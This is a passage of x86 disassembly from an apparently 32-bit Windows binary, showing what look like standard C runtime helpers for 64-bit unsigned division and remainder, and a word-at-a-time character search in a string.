  428ad3:	div    ecx
  428ad5:	mov    ebx,eax
  428ad7:	mov    eax,DWORD PTR [esp+0x8]
  428adb:	div    ecx
  428add:	mov    esi,eax
  428adf:	mov    eax,ebx
  428ae1:	mul    DWORD PTR [esp+0x10]
  428ae5:	mov    ecx,eax
  428ae7:	mov    eax,esi
  428ae9:	mul    DWORD PTR [esp+0x10]
  428aed:	add    edx,ecx
  428aef:	jmp    0x428b38
  428af1:	mov    ecx,eax
  428af3:	mov    ebx,DWORD PTR [esp+0x10]
  428af7:	mov    edx,DWORD PTR [esp+0xc]
  428afb:	mov    eax,DWORD PTR [esp+0x8]
  428aff:	shr    ecx,1
  428b01:	rcr    ebx,1
  428b03:	shr    edx,1
  428b05:	rcr    eax,1
  428b07:	or     ecx,ecx
  428b09:	jne    0x428aff
  428b0b:	div    ebx
  428b0d:	mov    esi,eax
  428b0f:	mul    DWORD PTR [esp+0x14]
  428b13:	mov    ecx,eax
  428b15:	mov    eax,DWORD PTR [esp+0x10]
  428b19:	mul    esi
  428b1b:	add    edx,ecx
  428b1d:	jb     0x428b2d
  428b1f:	cmp    edx,DWORD PTR [esp+0xc]
  428b23:	ja     0x428b2d
  428b25:	jb     0x428b36
  428b27:	cmp    eax,DWORD PTR [esp+0x8]
  428b2b:	jbe    0x428b36
  428b2d:	dec    esi
  428b2e:	sub    eax,DWORD PTR [esp+0x10]
  428b32:	sbb    edx,DWORD PTR [esp+0x14]
  428b36:	xor    ebx,ebx
  428b38:	sub    eax,DWORD PTR [esp+0x8]
  428b3c:	sbb    edx,DWORD PTR [esp+0xc]
  428b40:	neg    edx
  428b42:	neg    eax
  428b44:	sbb    edx,0x0
  428b47:	mov    ecx,edx
  428b49:	mov    edx,ebx
  428b4b:	mov    ebx,ecx
  428b4d:	mov    ecx,eax
  428b4f:	mov    eax,esi
  428b51:	pop    esi
  428b52:	ret    0x10
  428b55:	int3   
  428b56:	int3   
  428b57:	int3   
  428b58:	int3   
  428b59:	int3   
  428b5a:	int3   
  428b5b:	int3   
  428b5c:	int3   
  428b5d:	int3   
  428b5e:	int3   
  428b5f:	int3   
  428b60:	lea    eax,[edx-0x1]
  428b63:	pop    ebx
  428b64:	ret    
  428b65:	lea    esp,[esp+0x0]
  428b6c:	lea    esp,[esp+0x0]
  428b70:	xor    eax,eax
  428b72:	mov    al,BYTE PTR [esp+0x8]
  428b76:	push   ebx
  428b77:	mov    ebx,eax
  428b79:	shl    eax,0x8
  428b7c:	mov    edx,DWORD PTR [esp+0x8]
  428b80:	test   edx,0x3
  428b86:	je     0x428b9d
  428b88:	mov    cl,BYTE PTR [edx]
  428b8a:	add    edx,0x1
  428b8d:	cmp    cl,bl
  428b8f:	je     0x428b60
  428b91:	test   cl,cl
  428b93:	je     0x428be6
  428b95:	test   edx,0x3
  428b9b:	jne    0x428b88
  428b9d:	or     ebx,eax
  428b9f:	push   edi
  428ba0:	mov    eax,ebx
  428ba2:	shl    ebx,0x10
  428ba5:	push   esi
  428ba6:	or     ebx,eax
  428ba8:	mov    ecx,DWORD PTR [edx]
  428baa:	mov    edi,0x7efefeff
  428baf:	mov    eax,ecx
  428bb1:	mov    esi,edi
  428bb3:	xor    ecx,ebx
  428bb5:	add    esi,eax
  428bb7:	add    edi,ecx
  428bb9:	xor    ecx,0xffffffff
  428bbc:	xor    eax,0xffffffff
  428bbf:	xor    ecx,edi
  428bc1:	xor    eax,esi
  428bc3:	add    edx,0x4
  428bc6:	and    ecx,0x81010100
  428bcc:	jne    0x428bea
  428bce:	and    eax,0x81010100
  428bd3:	je     0x428ba8
  428bd5:	and    eax,0x1010100
  428bda:	jne    0x428be4
  428bdc:	and    esi,0x80000000
  428be2:	jne    0x428ba8
  428be4:	pop    esi
  428be5:	pop    edi
  428be6:	pop    ebx
  428be7:	xor    eax,eax
  428be9:	ret    
  428bea:	mov    eax,DWORD PTR [edx-0x4]
  428bed:	cmp    al,bl
  428bef:	je     0x428c27
  428bf1:	test   al,al
  428bf3:	je     0x428be4
  428bf5:	cmp    ah,bl
  428bf7:	je     0x428c20
  428bf9:	test   ah,ah
  428bfb:	je     0x428be4
  428bfd:	shr    eax,0x10
  428c00:	cmp    al,bl
  428c02:	je     0x428c19
  428c04:	test   al,al
  428c06:	je     0x428be4
  428c08:	cmp    ah,bl
  428c0a:	je     0x428c12
  428c0c:	test   ah,ah
  428c0e:	je     0x428be4
  428c10:	jmp    0x428ba8
  428c12:	pop    esi
  428c13:	pop    edi
  428c14:	lea    eax,[edx-0x1]
  428c17:	pop    ebx
  428c18:	ret    
  428c19:	lea    eax,[edx-0x2]
  428c1c:	pop    esi
  428c1d:	pop    edi
  428c1e:	pop    ebx
  428c1f:	ret    
  428c20:	lea    eax,[edx-0x3]
  428c23:	pop    esi
  428c24:	pop    edi
  428c25:	pop    ebx
  428c26:	ret    
  428c27:	lea    eax,[edx-0x4]
  428c2a:	pop    esi
  428c2b:	pop    edi
  428c2c:	pop    ebx
  428c2d:	ret    
  428c2e:	jmp    DWORD PTR ds:0x429104
